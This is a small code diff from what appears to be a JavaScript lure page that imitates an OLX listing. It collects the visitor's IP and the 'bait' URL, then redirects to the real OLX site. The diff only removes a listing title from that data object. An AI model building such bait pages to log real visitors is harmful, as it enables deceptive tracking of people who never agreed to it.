@@ -33,7 +33,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
             // Dados simulados
             const payload = {
-                titulo: "Camisa esportiva OLX",
                 url_isca: window.location.href,
                 redirecionamento: "https://www.olx.com.br",
                 ip: ip,
